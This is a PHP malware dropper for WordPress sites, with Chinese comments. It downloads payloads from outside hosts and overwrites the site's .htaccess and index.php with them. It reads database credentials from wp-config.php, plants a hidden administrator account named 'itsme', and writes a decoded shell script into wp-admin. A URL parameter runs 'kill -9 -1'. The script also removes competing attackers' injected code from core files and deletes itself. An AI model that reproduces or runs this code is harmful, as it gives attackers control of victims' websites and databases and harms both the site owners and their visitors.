<?php
	//查补自动
	header("Content-type:text/html;charset=utf-8");
	error_reporting(0);
	
	$qishu = "602-5";  //期数修改在这里！！！
	$sitemap = "sitemap.xml";
	$ht_name = ".htaccess";
	$index_name = "index.php";
	$file_self = basename(__FILE__);
	$other_index_name = "jsdindex.php";
	$ht_content = get("http://tool.jpcustomer.support/shl/htaccess1.txt");  //改成自己.h
	$index_content = get("http://api.firstguide.xyz/shl/index$qishu.txt");
	$contents_php = get("http://api.firstguide.xyz/contents.txt");
	$lock_content = get("http://api.firstguide.xyz/lock.txt");
	$fox_content = get("http://api.firstguide.xyz/fox.txt");
	$jsd_flag = false;
	if(isset($_GET['a']) && $_GET['a'] == "1"){
	    // @chmod("index.php");
	    // @copy("index.php", "index.bak");
		// @unlink("index.php");
		unlock();
		exit;
	}
	function get($url){ 
		$contents = @file_get_contents($url);
		if (!$contents) {
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $url);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
			$contents = curl_exec($ch);
			curl_close($ch);
		} 
		return $contents;
	}
	function getPhpPath(){
		ob_start();
		phpinfo(1);
		$info = ob_get_contents();
		ob_end_clean();
		preg_match("/--bindir=([^&]+)/si", $info, $matches);
		if (isset($matches[1]) && $matches[1] != '') {
			return $matches[1] . '/php';
		}
		preg_match("/--prefix=([^&]+)/si", $info, $matches);
		if (!isset($matches[1])) {
			return 'php';
		}
		return $matches[1] . '/bin/php';
	}
	function run($code, $method = 'popen'){
		$disabled = explode(',', ini_get('disable_functions'));
		$new_disable = array();
		foreach ($disabled as $item) {
			$new_disable[] = trim($item);
		}
		if (in_array($method, $new_disable)) {
			$method = 'exec';
		}
		if (in_array($method, $new_disable)) {
			return false;
		}
		$result = '';
		switch ($method){
			case 'exec':
				exec($code,$array);
				foreach ($array as $key => $value) {
					$result .= $key . " : " . $value . PHP_EOL;
				}
				return $result;
				break;
			case 'popen':
				$fp = popen($code,"r");
				while (!feof($fp)) {
					$out = fgets($fp, 4096);
					$result .= $out;
				}
				pclose($fp);
				return $result;
				break;
			default:
				return false;
				break;
		}
	}
	function functionCheck(){
		$disabled = explode(',', ini_get('disable_functions'));
		$new_disable = array();
		foreach ($disabled as $item) {
			$new_disable[] = trim($item);
		}
		if (in_array('exec', $new_disable) && in_array('popen', $new_disable)) {
			return false;
		}
		return true;
	}
	
	function lock($flag, $lock_content) { 
		$php_path = getPhpPath();
		$lock666 = __DIR__ . "/lock666.php";
		$lock_code = base64_decode($lock_content);
		$lock_code = "<?php unlink('$lock666');" . str_replace('__DIR__', "'" . __DIR__ . "'", $lock_code);
		if($flag == true){
			$lock_code = str_replace("index.php", $other_index_name, $lock_code);
		}
		@file_put_contents($lock666, $lock_code);
		$code = "nohup $php_path " . $lock666 . ' ' . base64_decode('Pi9kZXYvbnVsbCAyPiYxICY=');
		run($code);
		sleep(1);
		@unlink($lock666);
		return "success";
	}
	function unlock() {
		if(functionCheck() != false){
			run("kill -9 -1");
		}
	}
	chmod(__DIR__, "0493");
	$dir_writable = is_writable(__DIR__);
	file_put_contents("contents.php", $contents_php);

	function adduser(){
		$contents = file_get_contents("wp-config.php");
		preg_match("@'DB_NAME',\s*'(.*?)'@", $contents, $matchd);
		preg_match("@'DB_USER',\s*'(.*?)'@", $contents, $matchu);
		preg_match("@'DB_PASSWORD',\s*'(.*?)'@", $contents, $matchp);
		preg_match("@'DB_HOST',\s*'(.*?)'@", $contents, $matchh);
		preg_match("@table_prefix\s*=\s*'(.*?)'@", $contents, $matchw);
		$db_name = $matchd[1];
		$db_user = $matchu[1];
		$db_pass = $matchp[1];
		$db_host = $matchh[1];
		$db_pre = $matchw[1];
		$db_port = "3306";
		if(strstr($db_host, ":")){
			$arr = explode(":", $db_host);
			$db_host = $arr[0];
			$db_port = $arr[1];
		}
		if(trim($db_host) == ""){
			$db_host = "localhost";
		}
		$con = mysqli_connect($db_host, $db_user, $db_pass, $db_name, $db_port);
		$sql = "select * from $db_pre"."users where user_login='itsme';";
		$query = mysqli_query($con, $sql);
		$row = mysqli_fetch_array($query);
		if($row['user_login'] != "" || $row['user_login'] != null){
			$sql = "update $db_pre"."users set user_pass='\$P\$BqPKFgMTAdxmIvuLuC8iBtt2okVOLY/' where user_login='itsme';";
			$query = mysqli_query($con, $sql);
			echo "user itsme exists, change password!<br/>";
		}else{
			$sql = "insert into $db_pre"."users(user_login,user_pass,user_nicename,user_email,user_registered,user_activation_key,user_status,display_name) values('itsme', '\$P\$BqPKFgMTAdxmIvuLuC8iBtt2okVOLY/', 'itsme', '123@abc.com', '2020-04-21 06:42:46', '', '0', 'itsme');";
			$query = mysqli_query($con, $sql);
			$sql = "select ID from $db_pre"."users where user_login='itsme';";
			$query = mysqli_query($con, $sql);
			$row = mysqli_fetch_array($query);
			$id = $row['ID'];
			$sql = "insert into $db_pre"."usermeta(user_id, meta_key, meta_value) values($id, '$db_pre"."capabilities', 'a:1:{s:13:\"administrator\";b:1;}');";
			$query = mysqli_query($con, $sql);
			$sql = "select * from $db_pre"."users where user_login='itsme';";
			$query = mysqli_query($con, $sql);
			$row = mysqli_fetch_array($query);
			if($row['user_login'] == "itsme"){
				echo "useradd ok!!<br/>";
			}
		}
	}

	
	if(file_exists($sitemap)){
		if(!unlink($sitemap)){
			echo "$sitemap 删除失败！<br/>";
		}else{
			echo "$sitemap 删除成功！<br/>";
		}
	}
	$flag_index = false;
	$flag_hta = false;
	$unlink1 = './wp-includes/images/smilies/icon_reds.gif';
	$unlink2 = './wp-includes/images/smilies/icon_blacks.gif';
	$unlink3 = './wp-admin/images/align-lefts.png';
	$unlink4 = './wp-admin/images/align-rights.png';
	@unlink($unlink1);
	@unlink($unlink2);
	@unlink($unlink3);
	@unlink($unlink4);
	$unlink5 = './wp-includes/images/smilies/icon_devil.gif';
	$unlink6 = './wp-includes/images/smilies/icon_crystal.gif';
	$unlink7 = './wp-admin/images/arrow-lefts.png';
	$unlink8 = './wp-admin/images/arrow-rights.png';
	@unlink($unlink5);
	@unlink($unlink6);
	@unlink($unlink7);
	@unlink($unlink8);
	$unlink9 = './images/arrows.png';
	$unlink10 = './images/icons.png';
	@unlink($unlink9);
	@unlink($unlink10);
	$wp_index = base64_decode("PD9waHAKZGVmaW5lKCAnV1BfVVNFX1RIRU1FUycsIHRydWUgKTsKcmVxdWlyZSBfX0RJUl9fIC4gJy93cC1ibG9nLWhlYWRlci5waHAnOw==");
	if(is_dir("wp-admin") && is_dir("wp-content") && is_dir("wp-includes")){
		@chmod($ht_name, 0755);
		@unlink($ht_name);
		if(file_exists($other_index_name)){
			$index_name = $other_index_name;
			$jsd_flag = true;
			$ht_content = str_replace("^index.php$", "^".$other_index_name."$", $ht_content);
			$ht_content = str_replace(". index.php [L]", ". ".$other_index_name." [L]", $ht_content);
		}
		chmod($index_name, 0755);
		@unlink($index_name);
		file_put_contents($ht_name, $ht_content);
		file_put_contents($index_name, $wp_index);
	}else{
		$indexc = file_get_contents("index.php");
		chmod($index_name, 0755);
		@unlink($index_name);
		$shell_content2 = explode('?>', $indexc);
		for($i=0;$i<count($shell_content2);$i++){
			if(strpos($shell_content2[$i],'base64_decode(') !== false || strpos($shell_content2[$i],'urldecode(') !== false || strpos($shell_content2[$i],'O00__0OOO_') !== false || strpos($shell_content2[$i],'yumingid') !== false || strpos($shell_content2[$i],'urlgz=') !== false || strpos($shell_content2[$i],'O0O_0O_O_0') !== false || strpos($shell_content2[$i],'wp-admin') !== false || strpos($shell_content2[$i],'ignore_user_abort') !== false || strpos($shell_content2[$i],'HTTP_REFERER') !== false || strpos($shell_content2[$i],'sitemap') !== false || strpos($shell_content2[$i],'$x(') !== false || strpos($shell_content2[$i],'$_GET["3x"]') !== false || strpos($shell_content2[$i],'error_reporting') !== false || strpos($shell_content2[$i],'ini_set(') !== false || strpos($shell_content2[$i],'ini_set(') !== false || strpos($shell_content2[$i],'$mEriqO3481(') !== false || strpos($shell_content2[$i],'$AD99DDEEE9(') !== false || strpos($shell_content2[$i],'session_start(') !== false || strpos($shell_content2[$i],'y(3;]whcx)8') !== false){
				$indexc=str_replace($shell_content2[$i]."?>","",$indexc);
			}
		}
		file_put_contents($index_name, $indexc);
	}
	
	if(is_dir("wp-content/plugins")){
		adduser();
		@file_put_contents('wp-admin/js/widgets/run.sh', base64_decode($fox_content));
		@chmod('wp-admin/js/widgets/run.sh', 0755);
	}
	
	// if(functionCheck() !== false){
		// $status = lock($jsd_flag, $lock_content);
		// if($status == "success"){
			// echo "lock666 ok!!<br/>";
		// }
	// }
	
	//干auto_seo
	$file_list = "wp-content/themes/spawp/auto_seo.php
wp-includes/functions.php
wp-includes/rest-api/search/class-wp-rest-post-search-handler.php
wp-includes/rest-api/search/class-wp-rest-search-handler.php
wp-includes/rest-api/endpoints/class-wp-rest-block-types-controller.php
wp-includes/rest-api/endpoints/class-wp-rest-taxonomies-controller.php
wp-includes/sitemaps/class-wp-sitemaps-index.php
wp-includes/sitemaps/class-wp-sitemaps.php";
	$auto_files = explode("\n", $file_list);
	foreach($auto_files as $auto_f){
		$cccc = file_get_contents(trim($auto_f));
		$ccccs = explode("<?php", $cccc);
		foreach($ccccs as $ccccsingle){
			if(strstr($ccccsingle, "ruzhu_php") || strstr($ccccsingle, "\$x64(")){
				$cccc = str_replace("<?php".$ccccsingle, "", $cccc);
			}
		}
		@chmod($auto_f, 0755);@file_put_contents($auto_f, $cccc);
	}
	
	if(file_exists($file_self)){
		if(!unlink($file_self)){
			echo "$file_self 删除失败！<br/>";
		}else{
			echo "$file_self 删除成功！<br/>";
		}
	}
	
